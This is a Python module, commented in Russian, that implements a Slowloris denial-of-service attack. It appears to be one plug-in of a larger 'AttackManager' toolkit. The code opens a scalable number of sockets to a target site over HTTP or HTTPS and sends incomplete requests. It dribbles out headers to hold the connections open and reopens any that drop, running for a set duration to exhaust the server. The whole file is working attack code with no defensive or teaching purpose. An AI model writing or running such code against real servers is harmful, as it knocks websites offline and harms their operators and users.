import os
import sys
import time
import random
import socket
import threading
import ssl
from core.utils import Colors

class Slowloris:
    def __init__(self):
        self.stop_event = threading.Event()
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept-language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Keep-Alive: timeout=1000, max=1000"
        ]
    
    def create_socket(self, target, use_ssl=False):
        """Создает сокет и устанавливает соединение"""
        try:
            # Парсинг цели
            if '://' in target:
                target = target.split('://')[1]
            
            host = target.split('/')[0]
            path = '/' + '/'.join(target.split('/')[1:]) if '/' in target else '/'
            port = 80
            
            # Проверка SSL
            if use_ssl:
                port = 443
            
            # Разделение хоста и порта
            if ':' in host:
                host, port = host.split(':')
                port = int(port)
            
            # Создание сокета
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            
            # Обертка SSL при необходимости
            if use_ssl:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=host)
            
            # Установка соединения
            s.connect((host, port))
            
            # Отправка неполного запроса
            s.send(f"GET {path} HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            
            # Отправка части заголовков
            for i in range(random.randint(1, len(self.headers) - 1)):
                s.send(f"{self.headers[i]}\r\n".encode())
            
            return s
        except:
            return None
    
    def send_partial_headers(self, sock):
        """Периодически отправляет части заголовков для поддержания соединения"""
        try:
            while not self.stop_event.is_set():
                # Выбираем случайный заголовок
                header = random.choice(self.headers)
                sock.send(f"{header}\r\n".encode())
                time.sleep(random.uniform(1, 10))
        except:
            pass
    
    def start(self, target, power, duration, stop_event):
        """Запускает Slowloris атаку"""
        self.stop_event = stop_event
        sockets = []
        use_ssl = target.startswith('https')
        
        print(f"{Colors.ORANGE}[+] Starting Slowloris: {target} (Sockets: {power * 50}){Colors.RESET}")
        
        # Создание сокетов
        for _ in range(power * 50):
            if stop_event.is_set():
                break
                
            sock = self.create_socket(target, use_ssl)
            if sock:
                sockets.append(sock)
                time.sleep(0.1)
        
        # Запуск потоков для поддержания соединений
        threads = []
        for sock in sockets:
            t = threading.Thread(target=self.send_partial_headers, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Мониторинг и поддержка соединений
        start_time = time.time()
        while not stop_event.is_set() and time.time() - start_time < duration:
            try:
                # Восстановление закрытых соединений
                for i in range(len(sockets)):
                    if sockets[i] is None or sockets[i].fileno() == -1:
                        sockets[i] = self.create_socket(target, use_ssl)
                
                time.sleep(5)
            except KeyboardInterrupt:
                stop_event.set()
                break
        
        # Закрытие всех соединений
        for sock in sockets:
            try:
                if sock:
                    sock.close()
            except:
                pass
        
        print(f"{Colors.GREEN}[✓] Slowloris stopped{Colors.RESET}")

# Интерфейс для AttackManager
def start(target, power, duration, stop_event):
    slowloris = Slowloris()
    slowloris.start(target, power, duration, stop_event)